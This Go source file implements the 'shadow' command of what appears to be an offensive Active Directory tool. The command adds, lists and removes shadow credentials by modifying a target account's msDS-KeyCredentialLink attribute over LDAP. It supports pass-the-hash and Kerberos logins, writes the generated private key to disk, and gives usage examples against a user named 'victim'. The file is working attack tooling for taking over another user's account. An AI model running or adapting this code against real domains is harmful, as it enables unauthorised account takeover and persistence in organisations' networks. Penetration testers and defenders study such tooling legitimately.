package main

import (
	"fmt"
	"os"
	"strings"

	"github.com/loudmumble/certstrike/pkg/pki"
	"github.com/spf13/cobra"
)

var shadowCmd = &cobra.Command{
	Use:   "shadow",
	Short: "Shadow Credentials — msDS-KeyCredentialLink attacks",
	Long: `Manage shadow credentials on AD user objects via msDS-KeyCredentialLink.
Allows PKINIT authentication without requiring a CA.

Examples:
  certstrike shadow --add --target victim --target-dc dc01 --domain contoso.com -u admin -p pass
  certstrike shadow --list --target victim --target-dc dc01 --domain contoso.com -u admin -p pass
  certstrike shadow --remove --target victim --device-id <guid> --target-dc dc01 --domain contoso.com -u admin -p pass`,
	RunE: func(cmd *cobra.Command, args []string) error {
		doAdd, _ := cmd.Flags().GetBool("add")
		doList, _ := cmd.Flags().GetBool("list")
		doRemove, _ := cmd.Flags().GetBool("remove")

		if !doAdd && !doList && !doRemove {
			return cmd.Help()
		}

		targetDC, _ := cmd.Flags().GetString("target-dc")
		domain, _ := cmd.Flags().GetString("domain")
		username, _ := cmd.Flags().GetString("username")
		password, _ := cmd.Flags().GetString("password")
		hash, _ := cmd.Flags().GetString("hash")
		kerberos, _ := cmd.Flags().GetBool("kerberos")
		ccache, _ := cmd.Flags().GetString("ccache")
		keytabPath, _ := cmd.Flags().GetString("keytab")
		kdcIP, _ := cmd.Flags().GetString("dc-ip")
		target, _ := cmd.Flags().GetString("target")

		if targetDC == "" || domain == "" {
			return fmt.Errorf("--target-dc and --domain are required")
		}
		if !kerberos && (username == "" || (password == "" && hash == "")) {
			return fmt.Errorf("LDAP authentication required: use -u <user> -p <pass> (or --hash <NT_HASH> or -k for Kerberos)")
		}
		if target == "" {
			return fmt.Errorf("--target is required (sAMAccountName like 'leo' or full DN)")
		}

		cfg := &pki.ADCSConfig{
			TargetDC: targetDC, Domain: domain,
			Username: username, Password: password, Hash: hash,
			Kerberos: kerberos, CCache: ccache, Keytab: keytabPath, KDCIP: kdcIP,
		}

		// If target has no commas, it's a sAMAccountName — resolve via LDAP search
		if !strings.Contains(target, ",") {
			resolved, err := pki.ResolveSAMAccountName(cfg, target)
			if err != nil {
				return fmt.Errorf("resolve target %q: %w", target, err)
			}
			target = resolved
		}

		if doAdd {
			// Generate the key credential first (no LDAP yet)
			entry, err := pki.GenerateKeyCredential()
			if err != nil {
				return fmt.Errorf("generate key credential: %w", err)
			}

			// Write private key to disk BEFORE LDAP modify — if this fails, nothing
			// is orphaned in AD. If LDAP modify later fails, we clean up the file.
			keyPath := fmt.Sprintf("shadow_%s.key", entry.DeviceID[:8])
			keyFile, err := os.Create(keyPath)
			if err != nil {
				return fmt.Errorf("write key file: %w", err)
			}
			if err := pki.WriteECPrivateKey(keyFile, entry.PrivateKey); err != nil {
				keyFile.Close()
				os.Remove(keyPath)
				return fmt.Errorf("write key: %w", err)
			}
			keyFile.Close()

			// Now perform the LDAP modify to add the shadow credential
			if _, err := pki.AddShadowCredentialWithEntry(cfg, target, entry); err != nil {
				os.Remove(keyPath) // clean up key file on LDAP failure
				return err
			}

			fmt.Printf("[+] Private key written to: %s\n", keyPath)
			return nil
		}

		if doList {
			return pki.ListShadowCredentials(cfg, target)
		}

		if doRemove {
			deviceID, _ := cmd.Flags().GetString("device-id")
			if deviceID == "" {
				return fmt.Errorf("--device-id is required for removal")
			}
			return pki.RemoveShadowCredential(cfg, target, deviceID)
		}

		return nil
	},
}

func init() {
	rootCmd.AddCommand(shadowCmd)

	shadowCmd.Flags().Bool("add", false, "Add a shadow credential to the target")
	shadowCmd.Flags().Bool("list", false, "List shadow credentials on the target")
	shadowCmd.Flags().Bool("remove", false, "Remove a shadow credential from the target")
	shadowCmd.Flags().String("target", "", "Target user sAMAccountName or full DN (e.g. 'victim' — DN auto-built from --domain)")
	shadowCmd.Flags().String("device-id", "", "DeviceID of credential to remove")
	shadowCmd.Flags().String("target-dc", "", "Target domain controller")
	shadowCmd.Flags().String("domain", "", "Active Directory domain")
	shadowCmd.Flags().StringP("username", "u", "", "Domain username (user or user@domain)")
	shadowCmd.Flags().StringP("password", "p", "", "Domain password")
	shadowCmd.Flags().String("hash", "", "NTLM hash for pass-the-hash")
	shadowCmd.Flags().BoolP("kerberos", "k", false, "Use Kerberos authentication (GSSAPI/SPNEGO)")
	shadowCmd.Flags().String("ccache", "", "Path to Kerberos ccache file (default: KRB5CCNAME env)")
	shadowCmd.Flags().String("keytab", "", "Path to Kerberos keytab file")
	shadowCmd.Flags().String("dc-ip", "", "KDC IP address (if different from --target-dc)")
}
